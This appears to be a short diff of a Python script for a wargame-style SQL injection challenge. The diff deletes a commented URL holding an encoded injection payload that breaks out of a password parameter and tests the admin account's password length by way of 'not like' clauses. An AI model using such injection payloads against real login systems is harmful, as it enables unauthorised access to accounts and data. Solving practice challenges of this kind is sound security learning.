@@ -1,5 +1,3 @@
-#chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||length(pw)not%20like%208)%23
-
 import requests
 from dotenv import load_dotenv
 import os
